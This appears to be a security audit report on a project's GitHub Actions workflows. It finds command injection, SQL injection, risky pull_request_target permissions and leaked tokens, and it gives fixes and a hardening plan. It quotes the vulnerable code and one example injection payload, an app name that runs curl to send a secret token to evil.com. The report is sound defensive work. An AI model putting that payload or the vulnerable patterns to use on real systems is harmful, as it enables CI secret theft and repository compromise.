# GitHub Workflows Security Audit Report
Date: January 30, 2026

## Critical Security Vulnerabilities in GitHub Workflows

### Executive Summary
Multiple **CRITICAL** vulnerabilities identified that could lead to complete repository compromise and secret theft. The PLN_ENTER_TOKEN recent compromise (rotated Jan 28) may be related to these vulnerabilities.

## 🚨 CRITICAL VULNERABILITIES

### 1. Command Injection via App Submissions
**Severity**: CRITICAL - Remote Code Execution
**File**: `.github/scripts/app-review-agent.py`

**Vulnerable Code**:
```python
# Lines 202, 330, 340 - User input directly in shell commands
run_cmd(f'gh issue edit {ISSUE_NUMBER} --add-label "{label}"')
run_cmd(f'git commit -m "{commit_msg}"')
run_cmd(f'gh pr create --title "Add {parsed["name"]}"')
```

**Attack Vector**:
- Attacker submits app with name: `Test$(curl -X POST evil.com -d "token=$PLN_ENTER_TOKEN")`
- Command executes with full GitHub secrets access
- All secrets exfiltrated to attacker server

**Fix Required**:
```python
# Use subprocess with list arguments
subprocess.run(['gh', 'issue', 'edit', str(ISSUE_NUMBER), '--add-label', label])
```

### 2. SQL Injection in D1 Database
**Severity**: CRITICAL - Database Compromise
**File**: `.github/scripts/app-validate-submission.js:42`

**Vulnerable Code**:
```javascript
const cmd = `...--command "SELECT id, tier FROM user WHERE LOWER(github_username) = LOWER('${safeUsername}');"...`
```

**Attack**: GitHub username with SQL metacharacters bypasses weak sanitization

### 3. pull_request_target with Excessive Permissions
**Severity**: CRITICAL - Full Repo Compromise
**Files**: `app-review-submission.yml`, `project-manager.yml`

**Issue**:
```yaml
on:
  pull_request_target:  # Runs on untrusted PRs!
permissions:
  contents: write       # Can modify entire repo
  pull-requests: write
  id-token: write      # Can generate tokens
```

**Attack**: Malicious PR modifies scripts → workflow runs malicious code with secrets

### 4. PLN_ENTER_TOKEN Exposed in SSH
**Severity**: CRITICAL - API Token Theft
**File**: `deploy-enter-services.yml`

**Vulnerable Code**:
```yaml
env:
  PLN_ENTER_TOKEN: ${{ secrets.PLN_ENTER_TOKEN }}
script: |
  echo "Using PLN_ENTER_TOKEN: ${PLN_ENTER_TOKEN:0:10}..."  # Logged!
  curl -H "x-enter-token: $PLN_ENTER_TOKEN"  # Visible in ps
```

## 📊 Secrets Risk Assessment

| Secret | Usage Count | Risk Level | Exposure Vector |
|--------|-------------|------------|-----------------|
| PLN_ENTER_TOKEN | 2 workflows | **CRITICAL** | SSH logs, curl commands |
| CLOUDFLARE_API_TOKEN | 8 workflows | **HIGH** | Multiple contexts |
| SSH Keys (3) | 2 workflows | **CRITICAL** | Third-party actions |
| POLLY_BOT_PRIVATE_KEY | 10 workflows | **HIGH** | GitHub App auth |
| SOPS_AGE_KEY | 1 workflow | **CRITICAL** | Decrypts all secrets |

## 🔍 Attack Scenarios

### Scenario 1: App Submission Attack
1. Attacker opens issue with malicious app name
2. `app-review-submission.yml` triggers
3. Command injection in `app-review-agent.py`
4. All GitHub secrets stolen

### Scenario 2: PR Target Attack
1. Attacker creates PR modifying `.github/scripts/`
2. `pull_request_target` runs with secrets
3. Modified script exfiltrates all tokens
4. Repository fully compromised

### Scenario 3: SSH Deployment Attack
1. SSH connection logs show token prefix
2. Process listing shows full token in curl
3. Token captured from server memory
4. Unlimited API access gained

## ✅ Immediate Actions (DO TODAY)

### 1. Disable Vulnerable Workflows
```bash
# Add this to each vulnerable workflow:
if: github.actor == 'voodoohop' || github.actor == 'trusted-user'
```

### 2. Fix Command Injection
```python
# Replace ALL f-string shell commands:
# BAD:  run_cmd(f'gh issue edit {num} --label "{label}"')
# GOOD: subprocess.run(['gh', 'issue', 'edit', str(num), '--label', label])
```

### 3. Remove pull_request_target
```yaml
# Change to:
on:
  pull_request:  # Not pull_request_target
```

### 4. Secure Token Usage
- Never echo tokens (even partial)
- Don't pass tokens via SSH env
- Use GitHub OIDC instead of secrets

## 🛡️ Security Hardening Plan

### Phase 1: Emergency Fixes (Today)
- [ ] Disable vulnerable workflows
- [ ] Fix command injection bugs
- [ ] Remove token from SSH scripts
- [ ] Audit recent workflow runs for compromise

### Phase 2: Short Term (This Week)
- [ ] Implement OIDC for AWS deployments
- [ ] Add input validation for all user data
- [ ] Separate secrets by environment
- [ ] Enable secret scanning

### Phase 3: Long Term (This Month)
- [ ] Zero-trust architecture
- [ ] Workflow approval gates
- [ ] Security scanning pipeline
- [ ] Audit logging system

## 📈 Vulnerability Statistics

- **31** workflow files analyzed
- **22** secrets in use
- **4** CRITICAL vulnerabilities
- **10** HIGH vulnerabilities
- **15** MEDIUM vulnerabilities

## 🔐 Recommended Security Stack

1. **GitHub Advanced Security** - Secret scanning
2. **OIDC Provider** - Replace SSH keys
3. **Snyk/Semgrep** - SAST scanning
4. **Gitleaks** - Pre-commit hooks
5. **Falco** - Runtime security

## 📝 Checklist for Developers

When writing workflows:
- [ ] Never use `pull_request_target` with secrets
- [ ] Always validate user input
- [ ] Use subprocess lists, not f-strings
- [ ] Minimize permissions (`contents: read`)
- [ ] Pin action versions to SHA
- [ ] Never log secrets (even truncated)

## 🚨 Indicators of Compromise

Check for:
- Unexpected workflow runs
- Modified `.github/` files
- New SSH keys on EC2
- Unusual API usage patterns
- Unknown GitHub App installations

## Conclusion

The repository has **MULTIPLE CRITICAL** vulnerabilities that create various paths for attackers to steal the PLN_ENTER_TOKEN and other secrets. The recent token rotation (Jan 28) suggests possible exploitation.

**Most Likely Attack Vector**: Given the HTTP exposure identified in yesterday's incident report combined with these workflow vulnerabilities, the token was likely compromised through:
1. Direct HTTP interception (confirmed yesterday)
2. GitHub Actions command injection (high risk)
3. SSH deployment logs (medium risk)

**Required Actions**:
1. Fix command injection TODAY
2. Remove pull_request_target
3. Implement OIDC this week
4. Enable security scanning

---
Generated: January 30, 2026
Next Review: After fixes implemented